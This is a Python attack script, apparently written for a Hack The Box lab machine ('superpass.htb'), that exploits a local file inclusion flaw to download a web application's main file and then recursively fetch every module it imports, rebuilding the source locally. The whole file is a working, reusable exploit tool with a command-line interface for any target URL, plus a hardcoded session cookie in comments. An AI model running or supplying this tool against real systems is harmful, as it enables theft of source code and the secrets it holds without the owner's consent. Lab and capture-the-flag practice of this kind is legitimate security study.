import ast
import requests
import os
from pathlib import Path
from argparse import ArgumentParser

# ROOT_DIR = "dump"
# LFI_URL = "http://superpass.htb/download?fn=../app/app/superpass/"
# MAIN_FILE = "app.py"
# HEADERS = {"Cookie": "session=.eJwljrEOwyAMBf-FuQMYY0x-Joqxn9o1aaaq_16kSree7j5pxxnXM23v845H2l-etsThJppzdRL2TAqtpYbG6IAwacuDTH12LsccWo5-zBrmpuzMywWagDoHoVoNABxikqUZQDiyzikxyaIsVmtYK87igYpIa-S-4vzflJy-PygbMQQ.ZB8peQ.6WPsuWzA9fXt4RiCiDYIsIZ-uzs"}
# PACKAGE_NAME = "superpass"
# root = Path(Path.cwd() / ROOT_DIR)


def leak_file(file_path: str | Path):
    
    res = requests.get(LFI_URL + file_path, headers=HEADERS)
    if res.status_code != 200:
        return None
    saved_file = Path(root / file_path)
    saved_file.parent.mkdir(exist_ok=True, parents=True)
    with open(saved_file, 'w') as f:
        f.write(res.text)
    print(f"[*] Found {file_path}", flush=True)
    return saved_file


def parse_imports(file_path):
    with open(file_path, 'r') as f:
        node = ast.parse(f.read())
    imports = {}

    def traverse(node):
        if isinstance(node, ast.ImportFrom):
            module = node.module
            if module is not None and PACKAGE_NAME in module:
                imports[module] = []
                for alias in node.names:
                    imports[module].append(alias.name)
        elif isinstance(node, ast.Import):
            for alias in node.names:
                if PACKAGE_NAME in alias.name:
                    imports[alias.name] = None
        elif isinstance(node, ast.FunctionDef):
            for n in ast.walk(node):
                if isinstance(n, (ast.Import, ast.ImportFrom)):
                    traverse(n)

    for n in node.body:
        traverse(n)

    return imports


def convert_imports(imports: dict[str, str]):
    converted = []
    for key, val in imports.items():
        path = key.replace('.', '/')
        converted.append(path + '.py')
        if val is None:
            continue
        for v in val:
            sub_path = f'{path}/{v}.py'
            converted.append(sub_path)
    return converted


def run_recurse(path):
    file_path = leak_file(path)
    if file_path is not None:
        imports = parse_imports(file_path)
        if len(imports.items()) != 0:
            paths = convert_imports(imports)
            for p in paths:
                file_path = format_path(p)
                if Path(root / file_path).exists():
                    continue
                run_recurse(file_path)

def format_path(path: str):
    path = path.replace(PACKAGE_NAME, "")
    return path.removeprefix("/")

def main():
    if not root.exists():
        os.mkdir(root)
    path = leak_file(MAIN_FILE)
    imports = parse_imports(path)
    paths = convert_imports(imports)
    for p in paths:
        file_path = format_path(p)
        run_recurse(file_path)

def headers(string: str):
    split = string.split(":")
    return {split[0].strip():split[1].strip()}

if __name__ == "__main__":
    parser = ArgumentParser(description="Dump Python application files using LFI, traverse all imports and build a copy of the original")
    parser.add_argument('-u', '--url', type=str, required=True, help="Url containing the LFI and the base location of the app, example: http://example.com/?file=../../../var/www/app/")
    parser.add_argument('-m', '--main', default="app.py",help="Main file to start traversing from, usually app.py")
    parser.add_argument('-H', '--headers', type=headers)

    args = parser.parse_args()
    LFI_URL = args.url if args.url.endswith("/") else args.url + "/"
    MAIN_FILE = args.main.removeprefix("/")
    HEADERS = args.headers
    PACKAGE_NAME = LFI_URL.split('/')[-2]
    ROOT_DIR = "dump"
    root = Path(Path.cwd() / ROOT_DIR)

    main()
